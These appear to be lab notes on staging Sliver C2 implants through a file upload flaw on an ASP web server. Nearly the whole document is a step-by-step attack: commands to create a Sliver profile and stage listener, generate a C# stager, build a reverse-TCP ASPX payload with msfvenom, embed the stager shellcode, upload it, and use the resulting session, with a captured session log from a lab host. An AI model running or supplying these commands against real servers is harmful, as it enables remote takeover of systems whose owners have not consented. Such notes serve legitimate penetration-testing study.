Scenario: We have identified a file upload vulnerability on a ASP web server. We want to set up a stager to execute our implants. [Stagers Wiki](https://github.com/BishopFox/sliver/wiki/Stagers)

Stagers are the first-stage payload in a staged attack -- small and non-suspicious

Requirements
	Create a profile
	Create a stage-listener
	Create a stager
	Create a payload (msfvenom) `NOTE: This will get flagged by AV/EDR`

Using stagers
```bash
# New profile setup
sliver > profiles new --http <lhost>:8088 --format shellcode htb

# New stage-listener setup
sliver > stage-listener --url tcp://<lhost>:4443 --profile htb # stager listener
sliver > http -L <lhost> -l 8088                  # main, persistent c2 listener

# Generate stager implant 
sliver > generate stager --lhost <lhost> --lport 4443 --format csharp --save stager.txt

# msfvenom payload -- consider SharPyShell instead
msfvenom -p windows/shell/reverse_tcp LHOST=<lhost> LPORT=4443 -f aspx > payload.aspx

# the stager implant and payload must target out stager listener 4443 tcp, but the shellcode we generate from the stager makes all final comms hit us at 8088 http


# Modify payload in Page_Load function w/ stager implant payload
cat stager.txt               # Copy this
mousepad payload.aspx        # Edit this
modify page_load shellcode of payload. like so:
	byte[] STUFF = new byte[511] {<new_shellcode>} # stager shellcode goes here!!!
	
# Upload payload and execute - might take a few seconds to hit!
	[*] Session 49ac7d27 AGRICULTURAL_VIRUS - 10.129.205.234:49943 (web01) - windows/amd64 - Sat, 22 Nov 2025 16:04:11 EST

# Using the session
sliver > sessions      # view sessions, make note of ID
sliver > use <ID>      # use session
sliver > info          # gain info
```